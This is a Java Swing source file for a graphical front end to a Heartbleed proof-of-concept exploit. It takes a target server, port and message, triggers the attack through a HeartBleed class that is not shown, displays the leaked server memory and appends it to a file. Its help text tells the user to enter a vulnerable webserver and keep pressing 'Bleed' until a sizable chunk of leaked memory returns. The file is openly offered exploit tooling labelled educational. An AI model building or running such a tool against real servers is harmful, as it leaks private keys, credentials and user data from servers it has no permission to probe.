import javax.swing.*;

import java.awt.BorderLayout;
import java.awt.event.*;
import java.io.FileOutputStream;
import java.io.IOException;

public class HBGUI extends JFrame{
	
	HeartBleed mainBleed = new HeartBleed();
	
	private String jTextContent ="";
	
	private JPanel panel;
	
	private JLabel server;
	private JLabel port;
	private JLabel message;
	
	private JButton connect;
	private JButton save;
	private JButton help;
	
	private JTextField serverField;
	private JTextField portField;
	private JTextField messageField;
		
	private JTextArea output;
	private JScrollPane scrollOutput;
	
	private final int WIDTH = 800;
	private final int HEIGHT = 800;
	
	public HBGUI(){
		super("HeartBleed Proof of Concept");
		
		setSize(WIDTH,HEIGHT);
		
		setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		
		buildPanel();
		add(panel);

		setVisible(true);
	}
	
	private void buildPanel(){
		panel = new JPanel();
		
		server = new JLabel("Server:");
		port = new JLabel("Port:");
		message = new JLabel("Message: ");
		
		serverField = new JTextField(10);
		portField = new JTextField(3);
		messageField = new JTextField(10);
		
		help = new JButton("Help");
		help.addActionListener(new helpListener());
		
		connect = new JButton("Bleed");
		connect.addActionListener(new connectionListener());

		save = new JButton("Save");
		save.addActionListener(new saveListener());
		
		output = new JTextArea(40,60);
		output.setLineWrap(true);
		scrollOutput = new JScrollPane(output);

		
		panel.add(server);
		panel.add(serverField);
		panel.add(port);
		panel.add(portField);
		panel.add(message);
		panel.add(messageField);
		panel.add(connect);
		panel.add(save);
		panel.add(help);

		panel.add(scrollOutput);
		
	}
	
	private class connectionListener implements ActionListener{
		
		public void actionPerformed(ActionEvent ev){
			
			String server = serverField.getText();
			int port = Integer.parseInt(portField.getText());
			String message = messageField.getText();
			
			try{
				mainBleed.connect(server, port);
				mainBleed.hello();
				mainBleed.heartBeat(messageField.getText());
				mainBleed.close();
			}
			catch(IOException e){
				
				JOptionPane.showMessageDialog(null, "Bad server or port ");

			}
			
			String decoded = new String(mainBleed.getBytes());
			
			//append the 
			jTextContent = jTextContent + decoded;
			
			output.append(decoded);
			
			
		}
	}
	
	private class saveListener implements ActionListener{
		
		public void actionPerformed(ActionEvent ev){
			try {

				FileOutputStream out = new FileOutputStream("heart_bleed.txt", true);
				out.write(jTextContent.getBytes());
				out.flush();
				out.close();
				
				JOptionPane.showMessageDialog(null, "Saved to \"heart_bleed.txt\" ");
				
			} catch (IOException e) {
				e.printStackTrace();
			}
		
		}
	}
	
	private class helpListener implements ActionListener{
		
		public void actionPerformed(ActionEvent ev){
			JOptionPane.showMessageDialog(null, "Welcome to Alex's Heartbleed proof of concept\n"
					+ "It's actually pretty easy to use!\n"
					+ "Enter a vulnerable webserver under the 'server:' field \n"
					+ "Enter the port number (usually 443) under the 'port:' field\n"
					+ "And enter anything you want echoed back to you under the 'message:' field\n"
					+ "Just keep hitting 'bleed' until you get back a sizable chunk of leaked memory\n"
					+ "For educational purposes only!");
		}
	}
	
	
	
}
